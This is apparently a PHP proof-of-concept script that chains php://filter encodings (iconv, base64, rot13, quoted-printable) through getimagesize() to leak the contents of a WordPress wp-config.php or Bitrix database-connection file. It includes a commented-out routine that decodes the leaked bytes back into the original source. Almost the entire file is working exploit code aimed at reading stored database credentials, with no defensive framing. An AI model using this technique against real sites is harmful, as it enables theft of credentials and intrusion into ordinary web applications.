<?
header("Content-Type: text/plain");

//WordPress Config file
$filePath =  "test_configs/wp-config.php";
//or Bitrix DB connection file
// $filePath =  "test_configs/bitrix-dbconn.php";

$filters = "convert.quoted-printable-encode|convert.iconv.CP1254%2FUNICODEBIG|convert.base64-encode|convert.iconv.CP1254%2FUNICODEBIG|convert.base64-encode|string.rot13|convert.base64-decode|string.rot13|convert.base64-encode|string.rot13|convert.base64-decode";

$fileUri = "php://filter/$filters/resource=$filePath";
echo "getimagesize output: ".print_r(getimagesize($fileUri), true)."\r\n";
/*
echo "and decoded source:\r\n";
$encodedSource = file_get_contents($fileUri);
$originalSource = base64_encode($encodedSource);
$originalSource = str_rot13($originalSource);
$originalSource = base64_decode($originalSource);
$originalSource = str_rot13($originalSource);
$originalSource = base64_encode($originalSource);
$originalSource = str_rot13($originalSource);
$originalSource = base64_decode($originalSource);
$originalSource = str_replace("\x00", "", $originalSource);
$originalSource = base64_decode($originalSource);
$originalSource = str_replace("\x00", "",$originalSource);
echo $originalSource = quoted_printable_decode($originalSource);
*/

// var_dump(getimagesize("php://filter/string.toupper|convert.iconv.UTF8%2FIBM4899%2F%2FTRANSLIT|string.rot13|convert.quoted-printable-encode|convert.iconv.UTF8%2FIBM4899%2F%2FTRANSLIT|convert.iconv.WINDOWS-936%2FCP1388|convert.base64-encode|string.rot13|convert.base64-decode|string.rot13|convert.base64-encode|string.rot13|string.toupper/resource=$filePath"));
